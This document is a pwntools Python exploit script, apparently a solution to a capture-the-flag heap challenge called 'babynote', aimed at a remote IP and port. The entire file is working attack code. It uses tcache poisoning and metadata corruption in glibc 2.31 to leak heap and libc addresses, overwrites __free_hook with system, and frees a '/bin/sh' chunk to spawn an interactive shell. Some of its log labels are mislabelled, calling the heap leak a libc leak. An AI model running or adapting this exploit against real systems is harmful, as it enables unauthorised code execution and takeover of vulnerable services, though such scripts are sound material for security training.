from pwn import *

if args['LOCAL']:
    io = process(['./ld-2.31.so', './babynote'], env = {'LD_PRELOAD': './libc-2.31.so'})
else:
    io = remote('140.112.31.97', 30203)

libc = ELF('./libc-2.31.so')

def create(size, content):
    io.recvuntil('Choice >')
    io.sendline('1')
    io.recvuntil('Note size : ')
    io.sendline(str(size))
    io.recvuntil('Content : ')
    io.send(content)

def show(index): 
    io.recvuntil('Choice >')
    io.sendline('2')
    io.recvuntil('Note index : ')
    io.sendline(str(index))
    return io.recvline()

def edit(index, content):
    io.recvuntil('Choice >')
    io.sendline('3')
    io.recvuntil('Note index : ')
    io.sendline(str(index))
    io.recvuntil('Content : ')
    io.send(content)

def delete(index):
    io.recvuntil('Choice >')
    io.sendline('4')
    io.recvuntil('Note index : ')
    io.sendline(str(index))

create(0x78, 'A')
create(0x78, 'A')
delete(1)
delete(0)
create(0x78, '\x01')
create(0x78, p64(0) * 11 + p64(0x21))
leak = show(2).strip()
heap_leak = u64(leak.ljust(8, b'\0'))
heap_base = heap_leak - 0x301

log.info('libc leak = ' + hex(heap_leak))
log.info('libc base = ' + hex(heap_base))

delete(0)
delete(1)
edit(3, p64(heap_base + 0x18) + p64(0))
create(0x78, p64(0))
create(0x78, p64(0x600000000) + p64(0) + p64(0x7))

delete(1)
edit(3, p64(heap_base + 0x290) + p64(1))
create(0x78, p64(0))
create(0x78, p64(0) + p64(0xe1))

delete(0)
leak = show(2).strip()
libc_leak = u64(leak + b'\0\0')
libc.address = libc_leak - 0x1ebbe0
log.info('libc base = ' + hex(libc.address))
if args['GDB']:
    gdb.attach(io, '''

    ''')

delete(1)
edit(3, p64(libc.sym['__free_hook']) + p64(2))
create(0x78, p64(0))
create(0x78, p64(libc.sym['system']))

edit(3, '/bin/sh\0')
delete(3)




io.interactive()
